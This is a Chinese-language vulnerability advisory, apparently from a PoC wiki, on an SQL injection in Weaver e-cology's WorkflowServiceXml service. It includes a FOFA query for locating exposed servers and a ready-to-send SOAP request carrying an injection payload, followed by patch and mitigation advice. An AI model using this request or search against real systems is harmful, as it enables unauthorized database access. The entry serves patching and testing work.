---
fofa: "app="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 泛微E-Cology WorkflowServiceXml SQL注入漏洞

# 漏洞描述

该漏洞是由于泛微e-cology未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现 SQL 注入漏洞。

影响范围

e-cology 9 < 补丁版本 2024-07-10

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="泛微-OA（e-cology）"

POC/EXP：

POST /services/WorkflowServiceXml HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Type: text/xml
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> 
  <soapenv:Header/>
    <soapenv:Body>
      <web:getHendledWorkflowRequestList>
        <web:in0>1</web:in0>
        <web:in1>1</web:in1>
        <web:in2>1</web:in2>
        <web:in3>1</web:in3>
        <web:in4>
          <web:string>1=1 AND 2=2</web:string>
        </web:in4>
        </web:getHendledWorkflowRequestList>
    </soapenv:Body>
</soapenv:Envelope>

![image-20240714161831703](./.resource/泛微E-CologyWorkflowServiceXmlSQL注入漏洞/media/image-20240714161831703.png)


![image-20240714161856803](./.resource/泛微E-CologyWorkflowServiceXmlSQL注入漏洞/media/image-20240714161856803.png)


![image-20240714162051847](./.resource/泛微E-CologyWorkflowServiceXmlSQL注入漏洞/media/image-20240714162051847.png)


# 修复方案

升级修复方案

官方已发布升级补丁包，支持在线升级和离线补丁安装，可在参考链接[1]进行下载使用。

临时缓解方案

临时缓解方案可能无法完全阻止漏洞的利用，强烈建议尽快升级到修复版本。

1. 使用WAF等安全设备进行防护。

2. 在不影响业务的情况下配置URL访问控制策略。

3. 限制访问来源地址，如非必要，不要将系统开放在互联网上。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
